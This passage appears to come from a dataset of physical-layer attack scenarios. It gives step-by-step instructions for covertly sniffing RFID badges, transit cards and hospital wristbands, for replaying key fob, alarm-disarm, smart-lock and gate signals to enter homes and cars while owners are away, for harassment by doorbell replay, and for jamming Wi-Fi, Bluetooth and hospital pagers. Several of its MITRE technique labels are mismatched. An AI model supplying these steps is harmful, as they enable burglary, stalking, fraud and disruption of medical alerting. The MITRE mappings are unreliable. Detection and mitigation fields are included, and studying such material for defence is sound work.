- **Scenario**: Sniffing RFID cards used to open gated residential or office parking lots to replay access later.
- **Attack Steps**: Step 1: Park nearby the vehicle entry gate of a secured lot.Step 2: Set up the Proxmark3 with directional antenna pointing toward the gate reader.Step 3: Wait for a legitimate car to scan its RFID sticker or card.Step 4: Capture the emitted signal during the transaction.Step 5: Store the signal trace for analysis.Step 6: Use software tools to extract and decode UID and access command.Step 7: Simulate replay using another Proxmark or cloned tag.
- **Detection**: Motion detection; gate logs
- **Solution**: Use rolling code RFID; LPR-based access
- **Tags**: RFID, Parking Lot, Replay Attack

## RFID Medical Wristband Sniffing in Hospitals

- **Attack Type**: RFID Sniffing
- **Target**: Hospital Patient Tags
- **Vulnerability**: Passive unencrypted RFID tags
- **MITRE**: T1589.002
- **Impact**: Patient tracking or impersonation
- **Tools**: Mobile RFID Reader (SkyeModule), Covert Scanner, Android Tablet
- **Scenario**: Attacker walks through hospital corridors capturing RFID wristbands worn by patients.
- **Attack Steps**: Step 1: Walk casually through patient-access areas wearing a bag containing RFID scanning module.Step 2: Pass near beds where RFID wristbands are in range (10-30cm).Step 3: Capture transmitted patient tag data silently.Step 4: Store each UID with a timestamp for correlation.Step 5: Analyze data to map room-patient-tag IDs for surveillance simulation.Step 6: Demonstrate how this data could be used to impersonate or relocate patients in simulated attack.
- **Detection**: Monitor corridor RF levels; tag polling logs
- **Solution**: Use encrypted medical RFID with access control
- **Tags**: Medical, RFID, Privacy

## Sniffing Product RFID Tags in Retail Stores

- **Attack Type**: RFID Sniffing
- **Target**: Retail RFID Tags
- **Vulnerability**: Passive EPC tags exposed
- **MITRE**: T1592.001
- **Impact**: Inventory intelligence leakage
- **Tools**: UHF RFID Reader, Portable Antenna, SDR Software
- **Scenario**: Attacker captures product tag data from shelves to simulate competitor price analysis or inventory mapping.
- **Attack Steps**: Step 1: Enter a store with a concealed UHF RFID reader in a bag.Step 2: Walk through aisles slowly scanning RFID product tags.Step 3: Store scanned tag IDs with approximate location (aisle markers).Step 4: Export data and cross-reference with known product codes.Step 5: Use this to estimate pricing, restock cycles, or compare with another branch.Step 6: Simulate how an attacker can use this for corporate surveillance.
- **Detection**: RF shielding audits; retail scanner logs
- **Solution**: Encrypt product tag data; RFID zoning
- **Tags**: Retail, Espionage, Surveillance

## Metro Card RFID Sniffing While Seated Nearby

- **Attack Type**: RFID Sniffing
- **Target**: Metro Smartcard
- **Vulnerability**: No shielding or card timeout
- **MITRE**: T1040
- **Impact**: Fare fraud, surveillance
- **Tools**: NFC Phone, Sniffing App, Power Bank
- **Scenario**: Attacker sits next to a commuter and sniffs metro card RFID data stored in the bag.
- **Attack Steps**: Step 1: Sit beside a target on the metro with NFC phone enabled.Step 2: Open a background sniffing app that logs NFC activity.Step 3: Keep phone within 2-4cm of their bag pocket.Step 4: Capture any passive card response broadcast by the metro card.Step 5: Store captured tag ID locally and timestamp it.Step 6: Later simulate how this ID might be cloned or used for metro entry.
- **Detection**: Monitor card logs, tap time anomalies
- **Solution**: Use tokenized smartcards, shielding wallets
- **Tags**: Transit, Privacy, Sniffing

## Access Badge Sniffing Through Office Glass

- **Attack Type**: RFID Sniffing
- **Target**: Office ID Badge
- **Vulnerability**: Static tags without timeout
- **MITRE**: T1583.007
- **Impact**: Access cloning, physical intrusion
- **Tools**: Long-range RFID Reader, Proxmark3, USB SDR
- **Scenario**: Attacker positions an RFID reader near office glass walls to capture badges on desks.
- **Attack Steps**: Step 1: From outside a glass-walled office, place a concealed RFID reader facing inward.Step 2: Wait until employees leave their access badges on the desk.Step 3: Activate the reader to poll all badges in range.Step 4: Capture all tag IDs and store them.Step 5: Analyze signal strength to estimate badge location or floor.Step 6: Later replay or clone these badges in lab scenarios.
- **Detection**: EM field monitoring near glass walls
- **Solution**: Use badge lockers; time-expired tags
- **Tags**: RFID, Badge Theft, Remote Sniffing

## Delivery Parcel RFID Tag Sniffing at Loading Dock

- **Attack Type**: RFID Sniffing
- **Target**: RFID Parcel Tags
- **Vulnerability**: EPC Gen2 tags, unencrypted
- **MITRE**: T1591.002
- **Impact**: Customer data or shipment intel
- **Tools**: SDR, UHF Reader, Laptop, Directional Antenna
- **Scenario**: Sniff RFID parcel labels to collect customer or shipment metadata at delivery centers.
- **Attack Steps**: Step 1: Position yourself near the loading dock where parcels are scanned.Step 2: Use a UHF directional reader to scan exposed shipping labels with RFID.Step 3: Log each tag’s EPC code and associate timestamp/location.Step 4: Correlate tags to known tracking systems (mock database).Step 5: Analyze patterns of high-value shipments or customer identity.Step 6: Simulate leakage of customer logistics in training.
- **Detection**: Monitor unknown readers in delivery zones
- **Solution**: Use tamper-resistant RFID; encrypted labels
- **Tags**: Logistics, RFID, Privacy Breach

## Student ID RFID Sniffing in School Hallway

- **Attack Type**: RFID Sniffing
- **Target**: Student RFID ID
- **Vulnerability**: No UID obfuscation, always-on signal
- **MITRE**: T1589.001
- **Impact**: Attendance spoofing, stalking
- **Tools**: NFC Reader (USB), SDR Dongle, Raspberry Pi
- **Scenario**: Capturing RFID UIDs from student cards scanned at classroom doors.
- **Attack Steps**: Step 1: Place a Raspberry Pi with a USB RFID/NFC reader inside a locker or wall near door.Step 2: Power the setup with a portable battery.Step 3: Log every scan of student cards passing by.Step 4: Store timestamped UIDs on SD card.Step 5: After a day, remove device and analyze stored data.Step 6: Use in lab simulation to show tracking, impersonation risks.
- **Detection**: School security audits, RF sweeps
- **Solution**: Use access-limited zones; encrypt tags
- **Tags**: Education, ID Sniffing, Privacy

## Luggage RFID Sniffing in Airports

- **Attack Type**: RFID Sniffing
- **Target**: Baggage Tags
- **Vulnerability**: Static EPCs, publicly visible
- **MITRE**: T1589.003
- **Impact**: Travel profiling, targeted theft
- **Tools**: UHF Reader, Mobile Terminal, Data Logger
- **Scenario**: Attacker captures RFID baggage tag signals to map destination or passenger ID.
- **Attack Steps**: Step 1: Stand or walk near baggage collection or sorting belt.Step 2: Use a portable UHF reader in your bag to scan tags on luggage.Step 3: Record EPC values, timestamp, and gate details.Step 4: Match EPCs to flight database (mocked) in offline tool.Step 5: Show how attacker can use this data to track individuals or plan theft.Step 6: Conduct a controlled classroom replay with fake tags.
- **Detection**: RF sweeps, CCTV surveillance
- **Solution**: Randomize EPCs; encrypted tags
- **Tags**: Airport, Surveillance, RFID

## Sniffing RFID-Based Locker Keys at Gym

- **Attack Type**: RFID Sniffing
- **Target**: Gym Locker RFID Bands
- **Vulnerability**: Plaintext UIDs, unshielded tags
- **MITRE**: T1557 (Adversary-in-the-Middle)
- **Impact**: Unauthorized access to personal lockers
- **Tools**: Flipper Zero, USB RFID Reader, Hidden Antenna
- **Scenario**: An attacker captures RFID signals from gym locker keys left unattended or being used at smart lockers, aiming to later simulate unauthorized access.
- **Attack Steps**: Step 1: Visit a gym that uses RFID-based smart lockers for users to secure personal items. Step 2: Observe users who leave their RFID locker bands or cards on the bench while using the equipment. Step 3: Bring a concealed Flipper Zero device or small RFID reader inside a gym bag.Step 4: While pretending to sit nearby or access your own locker, scan the unattended RFID band or card from a few centimeters away.Step 5: The Flipper Zero automatically detects and logs the RFID UID.Step 6: Store the captured UID in a text file or internal memory of the device.Step 7: Later simulate cloning the UID onto a blank RFID key using an emulator for lab simulation of locker access bypass.
- **Detection**: Monitor locker access logs, check for duplicate UID use
- **Solution**: Use encrypted or challenge-response RFID systems; user training
- **Tags**: RFID, Locker, Gym, Cloning

## Sniffing Pet RFID Microchip at Vet Clinic

- **Attack Type**: RFID Sniffing
- **Target**: Animal Microchip
- **Vulnerability**: No encryption, static UID
- **MITRE**: T1589 (Obtain Credentials)
- **Impact**: Pet impersonation, ID spoofing
- **Tools**: RFID Reader (125 kHz), Portable Laptop, Notepad RFID Reader
- **Scenario**: A malicious actor captures RFID signals from pet microchips during check-in at a veterinary clinic, potentially for impersonation or animal identity fraud simulation.
- **Attack Steps**: Step 1: Position yourself in the waiting area of a veterinary clinic where pets are being scanned for their microchip ID. Step 2: Carry a small RFID sniffer tuned to the animal microchip frequency (usually 125 kHz).Step 3: When a vet uses a reader to scan the pet, the chip transmits its UID wirelessly.Step 4: Your sniffer picks up the same signal and records the UID silently.Step 5: Save the ID for analysis on a laptop or mobile terminal.Step 6: Later simulate using this ID to clone a chip or spoof data in an RFID emulator during a controlled lab scenario.
- **Detection**: Monitor chip scan logs, vet database mismatches
- **Solution**: Use encrypted pet chips or encrypt chip registry entries
- **Tags**: RFID, Animal Tracking, Vet

## Sniffing Hotel Laundry Tag RFID from Cart

- **Attack Type**: RFID Sniffing
- **Target**: Hotel Laundry Tags
- **Vulnerability**: Passive UHF, unencrypted EPC
- **MITRE**: T1591.002 (Gather Victim Org Info)
- **Impact**: Inventory fraud, privacy violation
- **Tools**: UHF RFID Reader, Handheld Scanner, Battery
- **Scenario**: An attacker captures RFID tags from linens and clothing in a hotel laundry cart to simulate inventory manipulation or supply chain data leakage.
- **Attack Steps**: Step 1: Enter a hotel corridor where cleaning staff temporarily park laundry carts filled with tagged towels or sheets.Step 2: Carry a handheld RFID scanner concealed in a shopping bag.Step 3: Pass by the cart slowly, allowing the reader to scan the tags through the fabric.Step 4: Capture multiple EPC tag values, store them locally, and tag them with timestamps.Step 5: Simulate how someone could later analyze these tags to infer room activity or manipulate stock counts.Step 6: Recreate this scenario in a lab by tagging clothes with fake RFID tags and replaying the scan.
- **Detection**: Audit laundry tracking system; unexpected scans
- **Solution**: Encrypt or randomize EPC values; restrict public access to carts
- **Tags**: RFID, Hotel, Inventory, Privacy

## Sniffing Tool RFID Tags in Industrial Workshop

- **Attack Type**: RFID Sniffing
- **Target**: Industrial Tool Tags
- **Vulnerability**: UIDs in plaintext, no integrity checks
- **MITRE**: T1595 (Active Scanning)
- **Impact**: Tampering logs, falsified audits
- **Tools**: UHF Reader with Antenna, RFID Logger Device
- **Scenario**: RFID tags are used on tools in high-security industrial workshops. An attacker sniffs tag IDs to simulate equipment tampering or tracking simulation.
- **Attack Steps**: Step 1: In an industrial environment using RFID-tagged tools, place a hidden RFID reader near the entrance or tool checkout area.Step 2: The device scans tags as workers pick up or return tools.Step 3: Each scanned RFID tag’s unique identifier is saved with timestamp.Step 4: Analyze movement patterns of specific high-value tools.Step 5: Later, use captured UIDs to simulate tracking a tool’s movement or impersonating its presence in a simulation.Step 6: Discuss the consequences in class: e.g., altering maintenance records or equipment logs based on spoofed tags.
- **Detection**: RF zoning or tag read logs
- **Solution**: Use cryptographic RFID systems; pair with physical logbook
- **Tags**: RFID, Tool Audit, Tampering

## Sniffing RFID Access Card Through Laptop Bag

- **Attack Type**: RFID Sniffing
- **Target**: Employee Access Badge
- **Vulnerability**: Always-on tag; no shielding
- **MITRE**: T1557.001
- **Impact**: Physical access bypass
- **Tools**: Android Phone with NFC Reader App, Hidden Scanner
- **Scenario**: Attacker captures RFID badge UID from a user’s access card stored in a laptop bag or wallet, simulating a stealth tag grab while commuting.
- **Attack Steps**: Step 1: Observe a target carrying a laptop bag or backpack that might contain their RFID access card.Step 2: Move close in a crowded area (bus stop, queue, elevator).Step 3: Use a phone with NFC reader app or dedicated device with a concealed antenna.Step 4: Briefly hold the scanner close (2–4 cm) to the target’s bag pocket.Step 5: If the card responds, record the UID silently.Step 6: Later simulate cloning this UID onto a dummy card in a lab to test unauthorized access potential.
- **Detection**: Use of RFID-detecting wallets or test scans
- **Solution**: RFID-blocking sleeves; time-gated RFID tags
- **Tags**: RFID, Bag Skimming, Privacy

## Car Key Fob Unlock Replay

- **Attack Type**: Signal Replay with SDR
- **Target**: Automotive Keyless Entry System
- **Vulnerability**: Lack of rolling code or weak protocol implementation
- **MITRE**: T1640 (Signal Interception)
- **Impact**: Unauthorized access to vehicle
- **Tools**: HackRF One, SDR# (SDRSharp), Universal Radio Hacker (URH)
- **Scenario**: Attacker records and replays a car’s key fob unlock signal to unlock the vehicle later without the key.
- **Attack Steps**: Step 1: Setup HackRF One and install URH on attacker’s laptop.Step 2: Wait near a car user and record the unlock signal when they press the key fob.Step 3: Save the captured signal waveform in URH.Step 4: Analyze to ensure the signal matches a single unlock event.Step 5: Replay the saved signal using HackRF One when the user is away.Step 6: Car unlocks without the key present.
- **Detection**: Anomalous wireless activity monitoring, RF jamming detection
- **Solution**: Use rolling codes, frequency hopping, or UWB key systems
- **Tags**: keyless entry, RF replay, SDR

## Garage Door Replay Attack

- **Attack Type**: Signal Replay with SDR
- **Target**: Garage Door RF Controller
- **Vulnerability**: Fixed RF codes without encryption
- **MITRE**: T1557.001 (RF Protocol Exploit)
- **Impact**: Physical access to building
- **Tools**: RTL-SDR, URH, GNU Radio
- **Scenario**: Replay attack on a legacy garage door opener that uses fixed-code RF signals.
- **Attack Steps**: Step 1: Plug in RTL-SDR and open URH.Step 2: Tune to the garage door RF frequency (e.g., 315 MHz).Step 3: Capture the signal when homeowner opens the garage.Step 4: Label and export the waveform.Step 5: Use HackRF or transmit module to replay the signal.Step 6: Door opens as if the remote was pressed.
- **Detection**: RF surveillance, mechanical logs
- **Solution**: Replace with rolling-code or encrypted system
- **Tags**: garage RF, fixed code, SDR attack

## Replay of Wireless Alarm Disarm

- **Attack Type**: Signal Replay with SDR
- **Target**: Home Security RF Alarm System
- **Vulnerability**: Insecure or static signal authentication
- **MITRE**: T1640
- **Impact**: Compromised home security
- **Tools**: HackRF One, URH
- **Scenario**: Disarming a home alarm system by replaying the RF signal from a disarm keyfob.
- **Attack Steps**: Step 1: Set HackRF to listen to 433 MHz or 868 MHz (common alarm bands).Step 2: When homeowner disarms the alarm, record the RF burst.Step 3: Store the waveform with a clear label in URH.Step 4: Later, when home is unoccupied, replay the disarm signal.Step 5: Alarm panel falsely detects valid disarm, disabling security.
- **Detection**: RF signal anomaly detection
- **Solution**: Use encrypted RF signals or tamper-evident logs
- **Tags**: alarm system, wireless security, SDR replay

## Smart Lock RF Signal Replay

- **Attack Type**: Signal Replay with SDR
- **Target**: Smart Home Locks
- **Vulnerability**: Unencrypted RF commands
- **MITRE**: T1557.002 (RF Injection)
- **Impact**: Unauthorized home access
- **Tools**: URH, HackRF One
- **Scenario**: Attacker captures RF communication between a smart lock and its key fob to unlock it later.
- **Attack Steps**: Step 1: Wait near a user while they unlock a smart RF-based door lock.Step 2: Record the RF burst using HackRF and URH.Step 3: Save and tag the signal for replay.Step 4: Return to the door when user is away.Step 5: Replay the signal and the door unlocks.Step 6: If the lock doesn’t use rolling code, attack succeeds.
- **Detection**: RF replay detectors, usage alerts
- **Solution**: Adopt BLE/NFC-based encrypted locks
- **Tags**: smart lock, SDR, replay attack

## RFID Badge Entry Replay

- **Attack Type**: Signal Replay with SDR
- **Target**: RFID Access Control
- **Vulnerability**: Static UID or weak authentication
- **MITRE**: T1557.002
- **Impact**: Physical access breach
- **Tools**: Proxmark3, SDR, URH
- **Scenario**: An attacker replays captured RFID badge signal to gain unauthorized building entry.
- **Attack Steps**: Step 1: Use Proxmark3 or SDR to sniff 125kHz or 13.56MHz RFID signal.Step 2: Wait for a legitimate user to badge in at entrance.Step 3: Record and analyze the signal.Step 4: Use the same SDR tool or badge emulator to replay it.Step 5: Entry system accepts the replayed signal.Step 6: Attacker gains unauthorized access.
- **Detection**: Access logs, badge replay monitoring
- **Solution**: Deploy mutual-auth RFID systems with dynamic keys
- **Tags**: RFID spoofing, signal replay, SDR

## Wireless Intercom Unlock Replay

- **Attack Type**: Signal Replay with SDR
- **Target**: Wireless Intercom Door System
- **Vulnerability**: Fixed command transmission without encryption
- **MITRE**: T1557.002
- **Impact**: Bypass of building access
- **Tools**: HackRF One, URH, SDRSharp
- **Scenario**: Replay of a signal sent from a wireless intercom system used to unlock a door remotely.
- **Attack Steps**: Step 1: Set up HackRF and tune it to the intercom system frequency (commonly 433 MHz).Step 2: Wait for someone to press the “unlock” button from the intercom to let a visitor in.Step 3: Capture and save the wireless signal.Step 4: Play back the saved signal while standing outside the gate.Step 5: The door opens automatically, thinking it was an authorized unlock.Step 6: Demonstrate that the system lacks proper authentication or signal rotation.
- **Detection**: Motion logs, RF spectrum monitoring
- **Solution**: Upgrade to secure intercom with encryption
- **Tags**: intercom unlock, signal replay, SDR

## Replay Attack on RF-Controlled Light System

- **Attack Type**: Signal Replay with SDR
- **Target**: Smart Home Light Systems
- **Vulnerability**: Unauthenticated RF signal transmission
- **MITRE**: T1640
- **Impact**: Disruption and harassment
- **Tools**: RTL-SDR, URH
- **Scenario**: A smart light system controlled by RF is replayed to switch lights on/off without permission.
- **Attack Steps**: Step 1: Use RTL-SDR to capture the signal when the homeowner uses their RF remote to toggle the light.Step 2: Save the waveform and label it as "light ON".Step 3: Record another signal labeled "light OFF".Step 4: Replay these at different times using HackRF or compatible transmitter.Step 5: Lights respond to the replayed command without authentication.Step 6: Used to cause annoyance or simulate ghost activity.
- **Detection**: RF signal fingerprinting, automation alerts
- **Solution**: Secure with Wi-Fi or Zigbee protocols that use encryption
- **Tags**: home automation, light control, SDR

## Replay Attack on Wireless Projector Remote

- **Attack Type**: Signal Replay with SDR
- **Target**: Conference Projector Systems
- **Vulnerability**: RF remotes without authentication
- **MITRE**: T1557.001
- **Impact**: Meeting disruption or sabotage
- **Tools**: HackRF One, URH, GNU Radio
- **Scenario**: Attacker records wireless signals from a projector remote to disrupt meetings.
- **Attack Steps**: Step 1: During a presentation, record signal sent when presenter turns off the projector using a remote.Step 2: Store the waveform and replay it from outside the room.Step 3: Projector unexpectedly turns off due to replayed signal.Step 4: Repeat with other buttons like volume or input change to cause confusion.Step 5: Use directional antenna to replay without entering room.Step 6: Demonstrate how low-security RF remotes can be misused.
- **Detection**: Environment sensors, projector logs
- **Solution**: Use IR remotes or encrypted controls
- **Tags**: remote disruption, wireless replay, SDR

## Drone Controller Signal Replay

- **Attack Type**: Signal Replay with SDR
- **Target**: Consumer Drones
- **Vulnerability**: RF command transmission without authentication
- **MITRE**: T1557.001
- **Impact**: Drone theft, disruption
- **Tools**: HackRF One, URH, GNURadio
- **Scenario**: Replay of a captured "land" or "return to home" signal sent to a consumer drone.
- **Attack Steps**: Step 1: Position HackRF to capture drone controller’s "return home" or "land" signal.Step 2: Save the signal using URH.Step 3: Replay the signal when the drone is mid-flight.Step 4: Drone begins returning or lands due to spoofed command.Step 5: Repeatable test showing RF command vulnerability.Step 6: Demonstrates insecure command protocols in consumer drones.
- **Detection**: Signal authentication logs, drone alerting
- **Solution**: Enforce encrypted command channels (Wi-Fi-based control)
- **Tags**: drone replay, RF spoof, SDR

## Medical Pager RF Signal Replay

- **Attack Type**: Signal Replay with SDR
- **Target**: Medical Paging System
- **Vulnerability**: Weak or no message validation
- **MITRE**: T1640
- **Impact**: Panic, alert fatigue
- **Tools**: RTL-SDR, URH
- **Scenario**: Replaying a previously sent hospital pager signal to create alert noise without any emergency.
- **Attack Steps**: Step 1: Set up RTL-SDR and listen to pager frequency (e.g., 929 MHz).Step 2: Record a pager broadcast triggering an alert.Step 3: Save the message or tone burst waveform.Step 4: Replay it later to generate false pager alert.Step 5: Demonstrates how outdated pager systems lack message integrity.Step 6: Can simulate panic in controlled scenarios.
- **Detection**: RF signal comparison and logs
- **Solution**: Upgrade to encrypted pager alternatives or mobile alerting
- **Tags**: hospital, RF alert, replay attack

## Replay Attack on Wireless Weather Sensor

- **Attack Type**: Signal Replay with SDR
- **Target**: Wireless Weather Station
- **Vulnerability**: No data integrity or encryption
- **MITRE**: T1557.001
- **Impact**: Data misrepresentation
- **Tools**: HackRF, URH
- **Scenario**: Replaying weather data signals from sensors to confuse or manipulate displayed values.
- **Attack Steps**: Step 1: Record wireless transmission from outdoor temperature sensor (usually 433 MHz).Step 2: Save the signal when it shows a very high temperature.Step 3: Replay this signal repeatedly to the indoor base station.Step 4: Display consistently shows false high temperature.Step 5: Use this simulation to show misinformation via wireless spoofing.Step 6: Optionally explore impact on automation systems linked to weather data.
- **Detection**: Base station checksum validation
- **Solution**: Upgrade to secure, authenticated sensors
- **Tags**: spoofed sensor data, RF weather, SDR

## Wireless Temperature Control Replay

- **Attack Type**: Signal Replay with SDR
- **Target**: Wireless Thermostat System
- **Vulnerability**: RF signal without authentication
- **MITRE**: T1557.002
- **Impact**: Energy misuse, discomfort
- **Tools**: HackRF, URH
- **Scenario**: Replay signal sent to a thermostat from a wireless remote to change room temperature settings.
- **Attack Steps**: Step 1: Observe user changing temperature using RF remote.Step 2: Capture the signal and save it in URH.Step 3: Replay the same signal when user leaves the room or home.Step 4: Thermostat receives and executes the command.Step 5: Demonstrate unauthorized manipulation of environmental controls.Step 6: Discuss energy waste or comfort disturbance implications.
- **Detection**: Alert logs, unexpected changes
- **Solution**: Upgrade to secure Zigbee or app-controlled units
- **Tags**: thermostat, wireless replay, SDR

## Wireless Fan Speed Replay Attack

- **Attack Type**: Signal Replay with SDR
- **Target**: Smart Fan RF Remote
- **Vulnerability**: Fixed signal reuse vulnerability
- **MITRE**: T1557.001
- **Impact**: Device misuse
- **Tools**: URH, RTL-SDR
- **Scenario**: Replay of signal used to control the speed of a ceiling fan in a smart home environment.
- **Attack Steps**: Step 1: Record the RF signal while user increases fan speed.Step 2: Store several signals like "Low", "Medium", and "High".Step 3: Replay the "High" signal repeatedly.Step 4: Fan keeps switching to high speed unexpectedly.Step 5: Use in classroom simulation to teach about signal-based device control.Step 6: Reinforce the importance of secure wireless protocol use.
- **Detection**: Unexpected behavior alerts
- **Solution**: Use encrypted Zigbee or BLE systems
- **Tags**: smart fan, RF remote, SDR replay

## Smart Irrigation Signal Replay

- **Attack Type**: Signal Replay with SDR
- **Target**: Smart Garden Systems
- **Vulnerability**: Lack of mutual authentication
- **MITRE**: T1640
- **Impact**: Water waste, garden damage
- **Tools**: HackRF One, URH
- **Scenario**: Attacker replays the "start irrigation" command to waste water or flood lawn.
- **Attack Steps**: Step 1: Identify irrigation controller frequency.Step 2: Capture signal when homeowner triggers watering.Step 3: Save signal as "start irrigation".Step 4: Replay multiple times during day or night.Step 5: System keeps turning on sprinkler despite schedule.Step 6: Can simulate environmental or financial sabotage in labs.
- **Detection**: RF usage logs, overwatering alerts
- **Solution**: Adopt Wi-Fi or BLE irrigation with app-based control
- **Tags**: irrigation, smart garden, SDR attack

## Smart Garage Light Replay

- **Attack Type**: Signal Replay with SDR
- **Target**: Garage Lighting System
- **Vulnerability**: Static RF control codes
- **MITRE**: T1557.002
- **Impact**: Psychological manipulation, nuisance
- **Tools**: HackRF, URH, SDRSharp
- **Scenario**: Replay the signal to toggle garage lights on/off without owner’s action.
- **Attack Steps**: Step 1: Use SDR to capture light toggle signal (usually 315 or 433 MHz).Step 2: Label "light ON" and "light OFF" waveforms.Step 3: Replay "ON" multiple times during the night.Step 4: Light turns on, potentially alerting or annoying residents.Step 5: Demonstrate how replay can mimic human behavior.Step 6: Discuss use cases in red teaming and physical penetration tests.
- **Detection**: RF audit logs
- **Solution**: Replace with smart systems using secure IoT protocols
- **Tags**: home lights, RF toggle, SDR

## Automatic Gate Remote Replay

- **Attack Type**: Signal Replay with SDR
- **Target**: Automatic Gate System
- **Vulnerability**: No encryption, no signal rotation
- **MITRE**: T1557.001
- **Impact**: Gated community entry without access
- **Tools**: HackRF One, URH, GNU Radio
- **Scenario**: Replay a captured RF signal that opens an automatic gate in residential societies.
- **Attack Steps**: Step 1: Stand near the gate of a residential apartment complex.Step 2: Wait for a car owner to press their gate remote to open it.Step 3: Use HackRF and Universal Radio Hacker to record the RF signal at the moment the gate opens. Common frequencies are 315 MHz or 433 MHz.Step 4: Save the waveform and label it “Gate Open”.Step 5: When the area is clear and no one is watching, replay the recorded waveform through HackRF.Step 6: The gate opens automatically again as if the remote was pressed.Step 7: Demonstrate how anyone with this simple equipment can replicate the entry signal without needing the original remote.
- **Detection**: CCTV monitoring, RF intrusion logs
- **Solution**: Upgrade to rolling code or Bluetooth-based access
- **Tags**: gate opener, RF clone, physical access

## Replay Attack on Wireless Blinds

- **Attack Type**: Signal Replay with SDR
- **Target**: Smart Window Blinds
- **Vulnerability**: Unauthenticated RF control commands
- **MITRE**: T1557.002
- **Impact**: Unauthorized visual access, annoyance
- **Tools**: HackRF One, URH
- **Scenario**: Remotely manipulating smart home window blinds by replaying captured RF open/close signals.
- **Attack Steps**: Step 1: Set up HackRF and tune into common smart blind RF frequencies (usually 433 MHz).Step 2: Wait until a user operates the blinds using the RF remote (e.g., presses “Open” or “Close”).Step 3: Record both signal transmissions using URH.Step 4: Save them separately with labels “Blinds Open” and “Blinds Close”.Step 5: Replay “Blinds Open” signal when blinds are closed, even if the homeowner is away.Step 6: Use this demonstration in classroom/lab to show how lack of signal authentication allows unauthorized control of home automation systems.Step 7: Replay repeatedly to simulate “ghost operation.”
- **Detection**: Smart hub activity logs, unusual triggers
- **Solution**: Use secure Zigbee/BLE automation with token-based access
- **Tags**: RF blinds, home automation, signal spoof

## Replay of Toll Gate RFID Tag

- **Attack Type**: Signal Replay with SDR
- **Target**: Toll RFID Entry System
- **Vulnerability**: Static UID with no session validation
- **MITRE**: T1640
- **Impact**: Free ride through tolls, financial abuse
- **Tools**: Proxmark3, URH, RFID reader
- **Scenario**: Simulating an attack where an attacker captures and replays the RFID signal of a toll tag to spoof vehicle presence.
- **Attack Steps**: Step 1: Use an RFID sniffer like Proxmark3 near a toll booth scanner.Step 2: Wait for a vehicle with an RFID tag (e.g., Fastag) to approach and trigger the gate.Step 3: Capture the signal emitted from the tag when it's read by the toll gate reader.Step 4: Save the waveform and note the vehicle ID encoded (if visible).Step 5: Move to a different toll booth or time, and replay the signal using SDR.Step 6: If the system doesn't use real-time validation, the gate opens without payment from the actual user.Step 7: In simulation, show how toll systems without server-side nonce checking are vulnerable.
- **Detection**: Central server validation, replay attack logs
- **Solution**: Use cryptographic nonce-based RFID systems
- **Tags**: toll fraud, RFID replay, vehicle spoofing

## Replay Attack on Wireless Doorbell

- **Attack Type**: Signal Replay with SDR
- **Target**: Wireless Doorbell System
- **Vulnerability**: Fixed signal with no device pairing
- **MITRE**: T1557.001
- **Impact**: Harassment, psychological disturbance
- **Tools**: RTL-SDR, URH
- **Scenario**: Replay signal to ring a wireless doorbell remotely without pressing the physical button.
- **Attack Steps**: Step 1: Stand near a home with a wireless RF-based doorbell system.Step 2: Wait until someone rings the bell, then capture the RF signal using RTL-SDR and URH.Step 3: Save the recorded waveform and label it “Doorbell Pressed”.Step 4: Walk away from the property and replay the signal at random times.Step 5: Doorbell rings unexpectedly, causing confusion or nuisance.Step 6: Replay it repeatedly at night or odd hours to simulate harassment.Step 7: Demonstrate how easy it is to manipulate poorly secured RF doorbell systems.
- **Detection**: Unusual ring logs, RF anomaly sensors
- **Solution**: Replace with encrypted or app-based doorbells
- **Tags**: doorbell prank, harassment, SDR replay

## Replay of Classroom Clicker Signal

- **Attack Type**: Signal Replay with SDR
- **Target**: Classroom Clicker System
- **Vulnerability**: Static RF code, no identity check
- **MITRE**: T1640
- **Impact**: False attendance, cheating
- **Tools**: HackRF, URH
- **Scenario**: Replay attack on student response clicker systems used in schools and colleges to fake attendance or answers.
- **Attack Steps**: Step 1: During a class, observe a student pressing the attendance or voting clicker.Step 2: Capture the RF signal transmitted by the clicker using HackRF and URH.Step 3: Store the waveform and label it with the student’s ID.Step 4: In the next class, replay the saved signal without the student being physically present.Step 5: Instructor's system falsely records that the student was present and responded.Step 6: Use in a lab setup to demonstrate how unencrypted academic systems can be gamed.Step 7: Raise awareness about digital integrity and authentication in academic tools.
- **Detection**: Usage logs, clicker ID monitoring
- **Solution**: Upgrade to authenticated app-based systems
- **Tags**: classroom, attendance fraud, SDR spoof

## Basic RF Jamming on Wi-Fi Channel

- **Attack Type**: Denial of Service via SDR
- **Target**: Wi-Fi Routers & Clients
- **Vulnerability**: Lack of RF filtering and signal integrity checks
- **MITRE**: T1498.001 (Network Denial of Service)
- **Impact**: Wi-Fi outage in target area
- **Tools**: HackRF One, GNU Radio
- **Scenario**: Simulating a simple Wi-Fi channel jamming using SDR to deny connectivity to nearby devices
- **Attack Steps**: Step 1: Connect HackRF One to a laptop with GNU Radio installed. Step 2: Identify target Wi-Fi channel (e.g., channel 6, 2.437 GHz) using tools like Wireshark or airodump-ng. Step 3: Use GNU Radio to build a simple flowgraph that transmits noise at 2.437 GHz. Step 4: Start transmitting continuous noise. Step 5: Observe how all nearby Wi-Fi clients on that channel lose connectivity.
- **Detection**: Spectrum analyzers, Wireless Intrusion Detection Systems (WIDS)
- **Solution**: Use channel hopping, 5GHz band, deploy WIDS/WIPS
- **Tags**: SDR, RF Jamming, Wi-Fi, HackRF

## RF Jamming of Bluetooth Devices

- **Attack Type**: Denial of Service via SDR
- **Target**: Bluetooth peripherals
- **Vulnerability**: Open ISM Band, No Encryption at PHY layer
- **MITRE**: T1498.001
- **Impact**: Wireless peripheral failure
- **Tools**: HackRF One, QSpectrumAnalyzer, GNU Radio
- **Scenario**: Jam Bluetooth spectrum to cause disconnection of wireless keyboards, headphones, or controllers
- **Attack Steps**: Step 1: Identify Bluetooth frequency range (2.402–2.480 GHz). Step 2: Connect HackRF One and install GNU Radio with jamming flowgraph. Step 3: Create wideband noise centered at 2.441 GHz covering the whole Bluetooth spectrum. Step 4: Transmit signal while monitoring with QSpectrumAnalyzer. Step 5: Bluetooth devices disconnect and fail to reconnect.
- **Detection**: Bluetooth Debuggers, Spectrum analysis
- **Solution**: Use wired devices or 5GHz-based alternatives
- **Tags**: Bluetooth, DoS, HackRF

## Jam Emergency Pager System

- **Attack Type**: Critical Infrastructure RF Jamming
- **Target**: Paging systems
- **Vulnerability**: Pager frequency is unencrypted and unauthenticated
- **MITRE**: T1498
- **Impact**: Communication delay/failure
- **Tools**: HackRF One, SDRSharp, RF Signal Generator
- **Scenario**: Simulate jamming of 900 MHz pager frequencies used in some hospital systems
